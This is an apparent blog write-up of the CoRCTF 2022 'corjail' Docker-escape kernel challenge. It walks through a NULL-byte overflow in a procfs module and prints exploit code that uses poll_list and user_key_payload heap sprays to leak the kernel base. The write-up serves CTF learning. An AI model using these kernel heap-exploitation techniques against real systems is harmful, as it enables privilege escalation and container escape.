<div class="keywords"><span class="btitle">keywords</span>
<p>
kernel exploit / docker escape / poll_list / kROP on tty_struct / tty_file_private / setxattr
</p>
</div>

<div class="contents">[:contents]</div>

////////////////////
JAPANESE ver is [HERE](https://smallkirby.hatenablog.com/entry/corjail)
////////////////////

# Intro

Hello, from inside a refrigerator. I'm a NEET.
Thesedays, I've benn working around front-end things, so its's the time I feel I wanna pwning in reaction. However, I plan to go other new internship job for 3mo from this week, and I'm just barely able to keep my sanity in the face of various environment changes and the like. So, to experience more new things and to place more stress on me, let's work on a docker escape pwn.
Today's challenge is **corjail** from **CoRCTF 2022**. AFAIR, I solved a challenge from CoRCTF in a previous blog entry. I really like challenges from this CTF. This is my first docker escape challenge, so I'd like to write down points where I got stucked and I made mistakes.
Well, honestly, I cheated to look at the author's writeup before working on the task. Note that I always take care that I don't check the details of writeups before working on it by myself. Without reading the detailed explanation or exploit code, I just pick up keywords or something, and think how I can use these keywords. Even if I cheat, the fun would be lost if I read everything in the writeup. In this entry, I would include debugging process such as my trial-and-errors or points I got stucked.

# devenv setup

First, clone the repo from [GitHub](https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/corjail/task/build).
There are so many distributed files, so take five minutes to play Smash.
Then, build the kernel image using `build_kernel.sh` (the script uses only single core, leading to never-ending build. I recommend to modify it with `make -jXXX`).
During the build, I encountered SSL-related error, so I disabled `MODULE_SIG_ALL` without any concern.
After that, generate a guest filesystem using `build_image.sh`. The script does many things, so you should check if the script does not harm your environment. It would generate `build/coros/coros.qcow2`. QCOW format file can be mount/unmount-ed using below script:

```mount.sh
### mount.bash
#!/bin/bash
set -eu

MNTPOINT=/tmp/hoge
QCOW=$(realpath "${PWD}"/../build/coros/coros.qcow2)

sudo modprobe nbd max_part=8
mkdir -p $MNTPOINT
sudo qemu-nbd --connect=/dev/nbd0 "$QCOW"
sudo fdisk -l /dev/nbd0
sudo mount /dev/nbd0 $MNTPOINT

### umount.bash
#!/bin/bash

set -eu
MNTPOINT=/tmp/hoge

sudo umount $MNTPOINT || true
sudo qemu-nbd --disconnect /dev/nbd0
sudo rmmod nbd
```

Okay, let me check the init flow first. Looking at the filesystem mounted by above script, you can see `/etc/inittab`:

```inittab
T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100
```

Nothing to say. Next, you can see `/etc/init.d/docker` which is the service script of docker daemon, but I just skip it cuz it's really normal. In `/etc/systemd/system/init.service`, below service is registered:

```/etc/systemd/system/init.service
[Unit]
Description=Initialize challenge

[Service]
Type=oneshot
ExecStart=/usr/local/bin/init

[Install]
WantedBy=multi-user.target
```

`/usr/local/bin/init` specified as `ExecStart` looks like below:

```/usr/local/bin/init.sh
#!/bin/bash

USER=user

FLAG=$(head -n 100 /dev/urandom | sha512sum | awk '{printf $1}')

useradd --create-home --shell /bin/bash $USER

echo "export PS1='\[\033[01;31m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]# '"  >> /root/.bashrc
echo "export PS1='\[\033[01;35m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '" >> /home/$USER/.bashrc

chmod -r 0700 /home/$USER

mv /root/temp /root/$FLAG
chmod 0400 /root/$FLAG
```

It creates new user(`user`), makes PS1 fancy, then changes permission of `flag`. `/etc/password` looks like:

```/etc/passwd
root:x:0:0:root:/root:/usr/local/bin/jail
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
(snipped...)
```

Login shell of `root` is `/usr/local/bin/jail`:

```/usr/local/bin/jail.sh
#!/bin/bash

echo -e '[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...'
/usr/bin/docker run -it --user user --hostname CoRJail --security-opt seccomp=/etc/docker/corjail.json -v /proc/cormon:/proc_rw/cormon:rw corcontainer
/usr/sbin/poweroff -f
```

After starting up docker container as `user`, it just `poweroff`. This seems the main point of init flow. It sets `--security-opt seccomp=/etc/docker/corjail.json`, which we would check later.
Strange procfs named `/proc/common` is bind-mounted, which we would also check later.
Okay, we now know that we can change login shell of `root` to `/bin/bash` in `/etc/password` if we wanna work in shell of guest OS(not on docker) for debug.
The result of `docker images` as `root` is below:

```.sh
root@CoROS:~# docker images
REPOSITORY     TAG             IMAGE ID       CREATED        SIZE
corcontainer   latest          8279763e02ce   2 months ago   84.7MB
debian         bullseye-slim   c9cb6c086ef7   3 months ago   80.4MB
```

We can see the image named `corcontainer`, which was used in `jail` script. `build_image.sh` says:

```build_image.sh
tar -xzvf coros/files/docker/image/image.tar.gz -C coros/files/docker
cp -rp coros/files/docker/var/lib/docker $FS/var/lib/
rm -rf coros/files/docker/var
```

The docker image seems to be generated beforehand. We want to place the latest exploit in a docker container on guest OS, so let me change `/usr/local/bin/jail` as below:

```/usr/local/bin/jail.sh
#!/bin/bash

echo -e '[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...'
cp /exploit /home/user || echo "[!] exploit not found, skipping"
chown -R user:user /home/user
echo 0 > /proc/sys/kernel/kptr_restrict
/usr/bin/docker run -it --user root \
  --hostname CoRJail \
  --security-opt seccomp=/etc/docker/corjail.json \
  --add-cap CAP_SYSLOG \
  -v /proc/cormon:/proc_rw/cormon:rw \
  -v /home/user/:/home/user/host \
  corcontainer
/usr/sbin/poweroff -f
```

Then we place `exploit` in guest filesystem, and the script above would automatically place it at `/home/user/exploit` in a docker container. We also add `--add-cap CAP_SYSLOG` to the docker run command, which is required to use `/proc/kallsyms`.
By the way, [lysithea](https://github.com/smallkirby/lysithea) would take care of all the tiny boring things except for first-time setup. So you can just run below command:

```lysithea.sh
lysithea init # first time only
lysithea extract # first time only
lysithea local
```
# static analysis

## misc

[lysithea](https://github.com/smallkirby/lysithea) says:

```lysithea.sh
root@CoRJail:/home/user/host# ./drothea --verbose
Drothea v1.0.0
[.] kernel version:
        Linux version 5.10.127 (root@VPS) (gcc (Debian 8.3.0-6) 8.3.0, GNU ld (GNU Binutils for Debian) 2.31.1) #2 SMP Thu January 1 00:00:00 UTC 2030
[-] CONFIG_KALLSYMS_ALL is enabled.
[!] unprivileged ebpf installation is enabled.
cat: /proc/sys/vm/unprivileged_userfaultfd: No such file or directory
[-] unprivileged userfaultfd is disabled.
[?] KASLR seems enabled. Should turn off for debug purpose.
[?] kptr seems restricted. Should try 'echo 0 > /proc/sys/kernel/kptr_restrict' in init script.
root@CoRJail:/home/user/host# ./ingrid --verbose
Ingrid v1.0.0
[-] userfualtfd is disabled.
[-] CONFIG_DEVMEM is disabled.
```

All the basic security mitigation is enabled. Reading build-script(`build_kernel.sh`) of the kernel, you can see below patch:

```patch.diff
diff -ruN a/arch/x86/entry/syscall_64.c b/arch/x86/entry/syscall_64.c
--- a/arch/x86/entry/syscall_64.c	2022-06-29 08:59:54.000000000 +0200
+++ b/arch/x86/entry/syscall_64.c	2022-07-02 12:34:11.237778657 +0200
@@ -17,6 +17,9 @@
 
 #define __SYSCALL_64(nr, sym) [nr] = __x64_##sym,
 
+DEFINE_PER_CPU(u64 [NR_syscalls], __per_cpu_syscall_count);
+EXPORT_PER_CPU_SYMBOL(__per_cpu_syscall_count);
+
 asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = {
 	/*
 	 * Smells like a compiler bug -- it doesn't work
diff -ruN a/arch/x86/include/asm/syscall_wrapper.h b/arch/x86/include/asm/syscall_wrapper.h
--- a/arch/x86/include/asm/syscall_wrapper.h	2022-06-29 08:59:54.000000000 +0200
+++ b/arch/x86/include/asm/syscall_wrapper.h	2022-07-02 12:34:11.237778657 +0200
@@ -219,9 +220,41 @@
 
 #define SYSCALL_DEFINE_MAXARGS	6
 
-#define SYSCALL_DEFINEx(x, sname, ...)				\
-	SYSCALL_METADATA(sname, x, __VA_ARGS__)			\
-	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)
+DECLARE_PER_CPU(u64[], __per_cpu_syscall_count);
+
+#define SYSCALL_COUNT_DECLAREx(sname, x, ...) \
+	static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__));
+
+#define __SYSCALL_COUNT(syscall_nr) \
+	this_cpu_inc(__per_cpu_syscall_count[(syscall_nr)])
+
+#define SYSCALL_COUNT_FUNCx(sname, x, ...)					\
+	{									\
+		__SYSCALL_COUNT(__syscall_meta_##sname.syscall_nr);		\
+		return __count_sys##sname(__MAP(x, __SC_CAST, __VA_ARGS__));	\
+	}									\
+	static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__))
+
+#define SYSCALL_COUNT_DECLARE0(sname) \
+	static inline long __count_sys_##sname(void);
+
+#define SYSCALL_COUNT_FUNC0(sname)					\
+	{								\
+		__SYSCALL_COUNT(__syscall_meta__##sname.syscall_nr);	\
+		return __count_sys_##sname();				\
+	}								\
+	static inline long __count_sys_##sname(void)
+
+#define SYSCALL_DEFINEx(x, sname, ...)			\
+	SYSCALL_METADATA(sname, x, __VA_ARGS__)		\
+	SYSCALL_COUNT_DECLAREx(sname, x, __VA_ARGS__)	\
+	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)	\
+	SYSCALL_COUNT_FUNCx(sname, x, __VA_ARGS__)
+
+#define SYSCALL_DEFINE0(sname)		\
+	SYSCALL_COUNT_DECLARE0(sname)	\
+	__SYSCALL_DEFINE0(sname)	\
+	SYSCALL_COUNT_FUNC0(sname)

(snpped...)
```

This seems to be [a patch to add syscall analytics to procfs](https://lwn.net/Articles/896474/). As you can see, the patch adds per-cpu variable named `__per_cpu_syscall_count` and counts the number of each syscalls.

## module analysis (rev)

Next, let me look into the main part, kernel module named `cormon.ko`. And then, I noticed that source code is not distributed!!! Okay, the organizer seems to be a bit too clumsy to forget attaching source code, I believe. Well, there's no other way, let's reverse the module using Ghidra. Decompiled module with little prettifying is as follows:

```decompiled.c
char *initial_filter = "sys_execve,sys_execveat,sys_fork,sys_keyctl,sys_msgget,sys_msgrcv,sys_msgsnd,sys_poll,sys_ptrace,sys_setxattr,sys_unshare";

struct proc_ops cormon_proc_ops = {
  .proc_open = cormon_proc_open,
  .proc_write = cormon_proc_write,
  .proc_read = seq_read,
};

struct seq_operations cormon_seq_ops = {
  .start = cormon_seq_start,
  .stop = cormon_seq_stop,
  .next = cormon_seq_next,
  .show = cormon_seq_show,
};

int init_module(void) {
  printk("6[CoRMon::Init] Initializing module...\n");
  if (proc_create("cormon", 0x1B5, 0, cormon_proc_ops) != 0) {
    return -0xC;
  }
  if (update_filter(initial_filter) != 0) {
    return -0x16;
  }
  
  printk("3[CoRMon::Error] proc_create() call failed!\n");
  return 0;
}

void cormon_proc_open(struct *inode inode, struct file *fp) {
  seq_open(fp, cormon_seq_ops);
  return;
}

ssize_t cormon_proc_write(struct file *fp, const char __user *ubuf, size_t size, loff_t *offset) {
  size_t sz;
  char *heap;
  if (*offset < 0) return 0xffffffffffffffea;
  if (*offset < 0x1000 && size != 0) {
    if (0x1000 < size) sz = 0xFFF;
    heap = kmem_cache_alloc_trace(?, 0xA20, 0x1000);
    printk("6[CoRMon::Debug] Syscalls @ %#llx\n");
    if (heap == NULL) {
      printk("3[CoRMon::Error] kmalloc() call failed!\n");
      return 0xfffffffffffffff4;
    }
    if (copy_from_user(heap, ubuf, sz) != 0) {
      printk("3[CoRMon::Error] copy_from_user() call failed!\n");
      return 0xfffffffffffffff2;
    }
    heap[sz] = NULL;
    if (update_filter(heap)) {
      kfree(heap);
    } else {
      kfree(heap);
      return 0xffffffffffffffea;
    }
  }
  return 0;
}

long update_filter(char *syscall_str) {
  char *syscall;
  int syscall_nr;
  char syscall_list[?] = {0};
  
  while(syscall = strsep(syscall, ",") && syscall != NULL && syscall_str != NULL) {
    if((syscall_nr = get_syscall_nr(syscall)) < 0) {
      printk("3[CoRMon::Error] Invalid syscall: %s!\n", syscall);
      return 0xffffffea;
    }
    syscall_list[syscall_nr] = 1;
  }
  
  memcpy(filter, syscall_list, 0x37 * 8);
}

int cormon_seq_show(struct seq_file *sfp, void *vp) {
  ulong v = *vp;
  if (v == 0) {
    int n = -1;
    seq_putc(sfp, 0xA);
    while((n = cpumask_next(n, &__cpu_online_mask)) < _nr_cpu_ids) { // for_each_cpu macro?
      seq_printf(sfp, "%9s%d", "CPU", n);
    }
    seq_printf(sfp, "\tSyscall (NR)\n\n");
  }
  
  if (filtter[v] != 0) {
    if((name = get_syscall_name(v)) == 0) return 0;
    int n = -1;
    while((n = cpumask_next(n, &__cpu_online_mask)) < _nr_cpu_ids) {
      seq_printf(sfp, "%10sllu", "CPU", __per_cpu_syscall_count[v]); // PER_CPU macro?
    }
    seq_printf(sfp, "\t%s (%lld)\n", name, v);
  }
  if (v == 0x1B9) seq_putc(sfp, 0xA);
  
  return 0;
}

void* cormon_seq_next(struct seq_file *fp, void *v, loff_t *pos_p) {
  loff_t pos = *pos_p;
  *pos_p++;
  if (pos < 0x1BA) return pos_p;
  return 0;
}

void* cormon_seq_stop(struct seq_file *fp, void *v) {
  return NULL;
}

void* cormon_seq_start(struct seq_file *fp, loff_t *pos_p) {
  if (*pos_p < 0x1BA) return pos_p;
  else return 0;
}
```

Reversing itself is not so hard cuz the module is simple.
It just creates an interface to display per-CPU variable named `__per_cpu_syscall_count`, which is introduced by the above patch.
This counter is incremented at the beginning of patched syscall by `__SYSCALL_COUNT()`. This increment is done for all syscalls regardless of `filter`.
`cormon` module `read` the file under `proc` to display statistics of syscalls filtered by `filter`. Also, it can update `filter` by writing to the proc file. The filter can be updated by writing comma-separated syscall names to `/proc_rw/cormon` (At the startup of docker, host `/proc/cormon` is bind-mounted to `/proc_rw/cormon`).

Here's what it looks like:

![CoROS, actually Debian BullsEye](https://hackmd.io/_uploads/SJPb85Fgj.png)

## seccomp

In `seccomp.json` (which is later copied inside VM as `corjail.json`), the filter is set as `defaultAction: SCMP_ACT_ALLOW`:

```seccomp.json
{
	"defaultAction": "SCMP_ACT_ERRNO",
	"defaultErrnoRet": 1,
	"syscalls": [
		{
            "names": [ "_llseek", "_newselect", (snipped...)],
			"action": "SCMP_ACT_ALLOW"
		},
		{
			"names": [ "clone" ],
			"action": "SCMP_ACT_ALLOW",
			"args": [ { "index": 0, "value": 2114060288, "op": "SCMP_CMP_MASKED_EQ" } ]
		}
	]
}

```

Disallowed syscalls looks like below (this is just a result of rough comparision, so there would be some mistakes):

```disallowed.txt
msgget
msgsnd
msgrcv
msgctl
ptrace
syslog
uselib
personality
ustat
sysfs
vhangup
pivot_root
_sysctl
chroot
acct
settimeofday
mount
umount2
swapon
swapoff
reboot
sethostname
setdomainname
iopl
ioperm
create_module
init_module
delete_module
get_kernel_syms
query_module
quotactl
nfsservctl
getpmsg
putpmsg
afs_syscall
tuxcall
security
lookup_dcookie
clock_settime
vserver
mbind
set_mempolicy
get_mempolicy
mq_open
mq_unlink
mq_timedsend
mq_timedreceive
mq_notify
mq_getsetattr
kexec_load
request_key
migrate_pages
unshare
move_pages
perf_event_open
fanotify_init
name_to_handle_at
open_by_handle_at
setns
process_vm_readv
process_vm_writev
kcmp
finit_module
kexec_file_load
bpf
userfaultfd
pkey_mprotect
pkey_alloc
pkey_free
```

Note that `unshare, mount, msgget, msgsnd, userfaultfd, bpf` are prohibited.

FYI, when I tried to run a exploit binary built as static including pthread on Ubuntu 22.04, it failed saying `Operation not permitted`.
It seems that [Docker doesn't have features to report blocked syscalls](https://blog.jp.square-enix.com/iteng-blog/posts/00016-wsl2-gui-seccomp-issue/), I had to find out a syscall which invokes the error.
As a result, it seems that `clone3` syscall is the cause of the error. So I applied below patch to `seccomp.json` (as far as I look into the writeup, use of pthread is intended, so this would be due to the difference of environment or impl of pthread...?)

```seccomp.patch
--- a/../build/coros/files/docker/seccomp.json
+++ b/./seccomp.json
@@ -10,6 +10,10 @@
                        "names": [ "clone" ],
                        "action": "SCMP_ACT_ALLOW",
                        "args": [ { "index": 0, "value": 2114060288, "op": "SCMP_CMP_MASKED_EQ" } ]
+               },
+               {
+                       "names": [ "clone3" ],
+                       "action": "SCMP_ACT_ALLOW"
                }
        ]
 }
```


# Vuln: NULL-byte overflow

The bug is apparent from the decompiiled code:
`cormon_proc_write()` copies user-supplied syscall string into `heap`(kmalloc-4k). Then it NULL-terminates `heap`. But if `size` is `0x1000`, it leads to NULL-byte overflow:


```.c
common_proc_write() {
  if (0x1000 < size) sz = 0xFFF;
  if (copy_from_user(heap, ubuf, sz) != 0) {...}
  ...
  heap[sz] = NULL;
  ...
}
```

`kmalloc-4k` slab cache is used here. Looking into [references](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628), there seems to be some useful structures. However, in this challenge, most common syscalls are filtered and there are no useful candidates in this list. I haven't been following up kernelpwn for a while, and I gave up! I cheated here to look through author's writeup. Viva cheating!

# pre-requisites

## `sys_poll`

It seems `sys_poll()` is useful. Source code around it looks as follow (non-related code is omitted):

```fs/select/select.c
#define FRONTEND_STACK_ALLOC	256
#define POLL_STACK_ALLOC	FRONTEND_STACK_ALLOC
#define N_STACK_PPS ((sizeof(stack_pps) - sizeof(struct poll_list))  / \
			sizeof(struct pollfd))
#define POLLFD_PER_PAGE  ((PAGE_SIZE-sizeof(struct poll_list)) / sizeof(struct pollfd))            
struct pollfd {
	int fd;
	short events;
	short revents;
}; /* size: 8, cachelines: 1, members: 3 */
struct poll_list {
	struct poll_list *next;
	int len;
	struct pollfd entries[];
}; /* size: 16, cachelines: 1, members: 3 */

static int do_sys_poll(struct pollfd __user *ufds, unsigned int nfds,
		struct timespec64 *end_time)
{
	struct poll_wqueues table;
	long stack_pps[POLL_STACK_ALLOC/sizeof(long)];
	struct poll_list *const head = (struct poll_list *)stack_pps;
 	struct poll_list *walk = head;

	len = min_t(unsigned int, nfds, N_STACK_PPS);
	for (;;) {
		walk->next = NULL;
		walk->len = len;
		if (!len)
			break;

		if (copy_from_user(walk->entries, ufds + nfds-todo,
					sizeof(struct pollfd) * walk->len))
			goto out_fds;

		todo -= walk->len;
		if (!todo)
			break;

		len = min(todo, POLLFD_PER_PAGE);
		walk = walk->next = kmalloc(struct_size(walk, entries, len),
					    GFP_KERNEL);
		if (!walk) {
			err = -ENOMEM;
			goto out_fds;
		}
	}

	fdcount = do_poll(head, &table, end_time);

	err = fdcount;
out_fds:
	walk = head->next;
	while (walk) {
		struct poll_list *pos = walk;
		walk = walk->next;
		kfree(pos);
	}

	return err;
}
```

First, it copies user-supplied `pollfd` list to `stack_pps` in the stack up to 256bytes. Strictly speaking, it copies up to 240bytes excluding 16bytes of `next` and `len` member onto the stack (in other words, 30 `struct pollfd`s).
If more than `ufds` are supplied by user, it then `kmalloc()`s and copies them up to the size of `POLLFD_PER_PAGE` (`(4096-16)/8 == 510`). In short, the type of slab cache used here is between kmalloc-32 ~ kmalloc-4k (~kmalloc-16 is never used due to 16bytes of `next` and `len` member).
After copying user-supplied `poll_list` and `pollfd` to 256bytes of stack and 32~4k heap, it creates a single-linked list linked by `next` pointer. When freeing, it simply `kfree()`s the list in order from the head.
I see. This structure can have a pointer pointing to the cache of arbitrary size between kmalloc-32~4k. In addition, you can `kfree` them by timer expiration, or by arbitrary events you can control. Really useful structure.

Using NULL-byte overflow stated above, we can partially overwrite `next` pointer in `struct pollfd`, leading to UAF(read) of object pointed to by overwritten pointer.
The problem is that `msgXXX` syscall is now filtered out. So which structure can we use to leak symbols?

## `add_key` / `keyctl` syscall

Yeah ofcourse I cheated. I heard that `add_key` syscall is useful. I didn't know about the syscall.
Speaking of which, looking through [default seccomp filter of docker](https://docs.docker.com/engine/security/seccomp/), `add_key` syscall is filtered out, while it is allowed in this challenge. Source code of `add_key` looks like:

```fs/select.c
// security/keys/user_defined.c
struct key_type key_type_user = {
	.name			= "user",
	.preparse		= user_preparse,
	.free_preparse		= user_free_preparse,
	.instantiate		= generic_key_instantiate,
	.update			= user_update,
	.revoke			= user_revoke,
	.destroy		= user_destroy,
	.describe		= user_describe,
	.read			= user_read,
};
int user_preparse(struct key_preparsed_payload *prep)
{
  struct user_key_payload *upayload;
  size_t datalen = prep->datalen;

  if (datalen <= 0 || datalen > 32767 || !prep->data)
      return -EINVAL;

  upayload = kmalloc(sizeof(*upayload) + datalen, GFP_KERNEL);
  ...
}

// security/keys/keyctl.c
SYSCALL_DEFINE5(add_key, const char __user *, _type,
		const char __user *, _description, const void __user *, _payload,
		size_t, plen, key_serial_t, ringid)
{
  key_ref_t keyring_ref, key_ref;
  char type[32], *description;
  void *payload;
  long ret;

  /* draw all the data into kernel space */
  ret = key_get_type_from_user(type, _type, sizeof(type));
  description = NULL;
  if (_description) {...}

  /* pull the payload in if one was supplied */
  payload = NULL;

  if (plen) {
      ...
      if (copy_from_user(payload, _payload, plen) != 0)
          goto error3;
  }

  keyring_ref = lookup_user_key(ringid, KEY_LOOKUP_CREATE, KEY_NEED_WRITE);
  key_ref = key_create_or_update(keyring_ref, type, description,
                     payload, plen, KEY_PERM_UNDEF, KEY_ALLOC_IN_QUOTA);
  ...
}

// security/keys/key.c
key_ref_t key_create_or_update(key_ref_t keyring_ref,
			       const char *type,
			       const char *description,
			       const void *payload,
			       size_t plen,
			       key_perm_t perm,
			       unsigned long flags)
{
  struct keyring_index_key index_key = {
      .description	= description,
  };
  struct key_preparsed_payload prep;                       
    
  index_key.type = key_type_lookup(type);
  memset(&prep, 0, sizeof(prep));
  ...
  if (index_key.type->preparse) {
      ret = index_key.type->preparse(&prep);
      ...
  }
  ...
  ret = __key_instantiate_and_link(key, &prep, keyring, NULL, &edit);
  ...
}
```

Okay. [manpage](https://man7.org/linux/man-pages/man2/add_key.2.html) says that there are 4 types of keys: `kerying`, `user`, `logon`, and `bigkey`.
Each key type has each `struct key_type` structure like `fops` of VFS. `.preparse()` function, which is a member of this handler and parses user-given payload, is identical with `user_preparse()` when the key type is `user`.
`user_preparse()` `kmalloc`s struct `user_key_payload`. This structure can have variable size and can be up to `sizeof(struct user_key_payload) + 32767` bytes under control of user.
Users can also `kfree` it at any desirable time ([`keyctl_revoke`](https://man7.org/linux/man-pages/man3/keyctl_revoke.3.html)) (Note: this sentence is a little bit wrong. Explained later).
Great structure, really. How the hell do pwners find such a useful kernel structures... In addition, it should be noted that **the value of the first member in this structure, `rcu`, is kept untouched til it is initialized**. Fu~~~.

# kbase leak via `user_key_payload` and `seq_operations`

Now, it seems we can leak kbase using these staff. Let me explain about the overview without details first.

In preparation, we call `add_key` syscall to place `struct user_key_payload` in kmalloc-32.
Then, we call `poll` for 542 fds (30 in stack + 510 in kmalloc-4k + 2 in kmalloc-32). Then, a list in `struct poll_list` is constructed as `stack --> kmalloc-4k --> kmalloc-32`. After that, we write to the module's block file to invoke `cormon_proc_write()`, which ends in NULL-byte overflow. The buffer of this function is allocated in `kmalloc-4k`, so if the conditions are met, the last byte of `poll_list.next` pointer in kmalloc-4k is partially overwritten. If the addr is desirable, overwritten pointer would point to `user_key_payload`, which we prepared in the first step.
Then, we free `poll_list` (both timer expiration and event trigger is okay) to `kfree`s `user_key_payload` linked to the list of `poll_list`. Now, UAF of `user_key_payload` is achieved.
To leak kbase, we allocate `seq_operations` or something on the `user_key_payload`. Finally, we just read payload of the key via `keyctl_read`. kbase is leaked.
When we think about these scenario, it seems pretty easy. But I wrote that *if conditions are met*. So we have to make the conditions met. I believe kheap spraying is enough, hopefully.

Okay, let me go through in order.
First, place keys in kmalloc-32 by `add_key()`. Note that there are no glibc wrapper for `add_key` syscall, so you have to install a package like `libkeyutils-dev`, and then build an exploit with `-lkeyutils`.
Spray keys like below:

```spray_keys.c
void spray_keys() {
  char *desc = calloc(0x100, 1);
  if (desc <= 0) errExit("spray_keys malloc");
  strcpy(desc, DESC_KEY_TOBE_OVERWRITTEN_SEQOPS);

  for (int ix = 0; ix != NUM_KEY_SPRAY; ++ix) {
    memcpy(desc + strlen(DESC_KEY_TOBE_OVERWRITTEN_SEQOPS), &ix, 4);
    char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
    memset(key_payload, 'A', SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
    key_serial_t keyid0 = add_key("user", desc, key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, KEY_SPEC_PROCESS_KEYRING);
    if (keyid0 < 0) errExit("add_key 0");
  }
}
```

Then, you can find our target objects in kmalloc-32 heap (using `pt -ss AAAAAAAA -align 8`). This would be `kmalloc-32`. We can confirm it by the payload `AAAAAAAA` we prepared as a needle, and the fact that the previous short value is `0x08`(`ushort datalen`).
![user_key_payload in kmalloc-32](https://hackmd.io/_uploads/HkpRN-sli.png)

BTW `user_key_payload` are not placed in next to each other 。We can guess that `CONFIG_SLAB_FREELIST_RANDOMIZE` or something is enabled in this kernel。 Then, spray `poll_list` in `kmalloc-4k` and `kmalloc-32`:

```alloc_poll_list.c
  assign_to_core(0);
  for (int ix = 0; ix != NUM_POLLLIST_ALLOC; ++ix) {
    if(pthread_create(&threads[ix], NULL, alloc_poll_list, &just_fd) != 0) errExit("pthread_create");
  }
```

![search for poll_list](https://hackmd.io/_uploads/SktKxMseo.png)

![poll_list in kmalloc-4k](https://hackmd.io/_uploads/B1r7z7jei.png)

This time, we `poll` for the event `POLLERR`(`=0x0008`), and we use `fd == 0x00000004`, so we can use bytes `0x0000000400080000` as a needle for search (`pt -sb 08000000040000000800000004000000 -align 16`. though `pt -sb fe01000004000000 -align 8` would be better). BTW, I noticed that `struct pollfd[]` in `poll_list` is not aligned. Due to this unalignment, I spent crazy times on finding target `poll_list`. And I forgot saying that this `pt` command means [gdb-pt-dump](https://github.com/martinradev/gdb-pt-dump).

![pahole of pollfd](https://hackmd.io/_uploads/SJ9oezjei.png)
![pahole of poll_list](https://hackmd.io/_uploads/HJ6pZMogs.png)

Good. Each structures seems to be allocated in intended size of caches for now.
Under this situation, let's invoke the NULL-byte overflow.

```overflow.c
void nullbyte_overflow(void) {
  assert(cormon_fd >= 2);
  memset(cormon_buf, 'B', 0x1000 + 0x20);
  strcpy((char*)cormon_buf + 1, "THIS_IS_CORMON_BUFFER");
  *cormon_buf = 0x00;

  if(write(cormon_fd, cormon_buf, 0x1000) != -1) errExit("nullbyte_overflow");
  errno = 0;
}
```
![search for NULL-overflowed poll_list](https://hackmd.io/_uploads/H1vxWQixj.png)

Hmm, it seems that a slab object in next to vulnerable heap object is NULL-byte overflowed, but apparently this object is not `struct poll_list` (cuz `.len` member is invalid). After try and errors, things went to good when I changed the number of spray of `struct poll_list` as `0x10 -> 0x10-2`. When you do kheap spray, this kind of small adjustment is important, I believe:

![actually, poll_list is NULL-byte overflowed!](https://hackmd.io/_uploads/S1uqr7sxo.png)

Actually, `struct poll_list` is allocated in next to the buffer allocated in `cormon_proc_write()`, and first byte of `poll_list.next` is NULL-byte overflowed. FYI, author's writeup told me that you should control which CPU core to use when spraying by `sched_setaffinity()`. Good point, actually. Slab cache is per-CPU. Genius.
Here, it is important that the addr(`0xffff888007617500`) pointed to by overwritten `next` pointer must be `user_key_payload`, which we prepared in kmalloc-32 in the first step. And the first member `user_key_payload.rcu` must be NULL. Let me check...:

![user_key_payload is pointed to by poll_list.next](https://hackmd.io/_uploads/HkhwL7slo.png)

Perfect. After that, we just wait for seconds to timeout `poll` syscall, and `poll_list` are `kfree`ed in order from the head. `user_key_payload` is also freed. So we just allocate new structure as you like on this key. The structure should be in `kmalloc-32`, and should contains kptr. This time, we use `seq_operations`:

```seq_operations.c
  // Check all keys to leak kbase via `seq_operations`
  char keybuf[0x100] = {0};
  ulong leaked = 0;
  for (int ix = 0; ix != NUM_KEY_SPRAY; ++ix) {
    memset(keybuf, 0, 0x100);
    if(keyctl_read(keys[ix], keybuf, 0x100) < 0) errExit("keyctl_read");
    if (strncmp(keybuf, "AAAA", 4) != 0) {
      leaked = *(ulong*)keybuf;
    }
  }
  if (leaked == 0) {
    puts("[-] Failed to leak kbase");
    exit(1);
  }
  printf("[!] leaked: 0x%lx\n", leaked);
```

![panic, but leak fails](https://hackmd.io/_uploads/H1mx3Xigj.png)

U~~~~n, it panics, so we achieved some evil thing, but leak is not performed. Let's dig into using gdb:

![the former is overflowed poll_list, the latter is user_key_payload as seq_operations](https://hackmd.io/_uploads/S10OTQjes.png)

The former is overflowed `poll_list`, and the latter is freed `user_key_payload` which was previously linked by `poll_list.next`, and now is `seq_operations`. It looks perfect, no strange points. I guessed that we have to saturate `kmalloc-32` more and more beforehand, and I tried to spray more `user_key_payload`. But I encountered below error:

![Disk quota exceeded](https://hackmd.io/_uploads/BkIbN8jgo.png)

I haven't researched, but it seems keys cannot be allocated many times. So I did more spray using `seq_operations`. In addition, I changed exploit to allocate `seq_operations` immediately right after every `pthread_join()`.
However, I couldn't leak kbase by `keyctl_read()`...!:

![somehow, kernel pointer cannot be leaked...](https://hackmd.io/_uploads/H1QOQOieo.png)

After 80years of trouble, I noticed below description in manpage of `keyctl_read`:

```keyctl_read.man
RETURN VALUE
       On  success  keyctl_read()  returns  the amount of data placed into the buffer.  If the buffer was too small, then the size of
       buffer required will be returned, and the contents of the buffer may have been overwritten in some undefined way.
```

Ah, if you pass small buffer as an argument, this syscall ends in undefined behaviour... Okay, I changed the size of buffer for `keyctl_read()` enough large (>=0x4330 in this case) and tried again:

![kbase leak success after extending buf size!](https://hackmd.io/_uploads/BkJCLuigo.png)

Seems good...!

# leak kheap via `tty_struct` / `tty_file_private`

We achieved kbase leak. Okay then, what should I do. I once assumed that I can free `user_key_payload` (aka `seq_operations` in this time) as `user_key_payload`, overwrite function pointers in `seq_operations` using `setxattr`, then I can get RIP.
But I realized this kernel uses KPTI, so we have to do stack pivot. It means we need to leak kheap addr.

